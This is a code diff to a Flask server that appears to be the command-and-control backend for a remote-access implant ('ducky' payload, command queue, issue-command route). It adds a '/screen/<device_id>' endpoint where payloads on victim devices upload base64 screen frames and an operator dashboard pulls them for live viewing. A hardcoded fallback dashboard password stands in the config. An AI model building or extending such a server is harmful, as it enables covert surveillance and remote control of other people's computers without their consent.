@@ -19,6 +19,7 @@ SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_RO
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
 
 command_queue = {}
+screen_frames = {} # NEW: Store latest screen frames for live viewing
 
 # ---------------------------------------------------------
 # HELPER FUNCTIONS
@@ -133,6 +134,27 @@ def push_logs():
         return jsonify({"status": "success"}), 200
     except requests.exceptions.RequestException: 
         return jsonify({"error": "Database push failed"}), 500
+
+@app.route('/screen/<device_id>', methods=['POST', 'GET'])
+def handle_screen(device_id):
+    """Handles screen sharing frames. POST from payload, GET from dashboard."""
+    # Payload posts base64 frames here
+    if request.method == 'POST':
+        data = request.json
+        if not data or 'frame' not in data:
+            return jsonify({"error": "Missing frame data"}), 400
+        # Store the latest frame in the in-memory dictionary
+        screen_frames[device_id] = data['frame']
+        return jsonify({"status": "frame received"}), 200
+
+    # Dashboard gets the latest frame from here
+    if request.method == 'GET':
+        # SECURITY CHECK: Make sure the request came from your dashboard
+        if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
+            return jsonify({"error": "Unauthorized access"}), 401
+        
+        frame = screen_frames.get(device_id, None)
+        return jsonify({"frame": frame})
 
 @app.route('/issue', methods=['POST'])
 def issue_command():
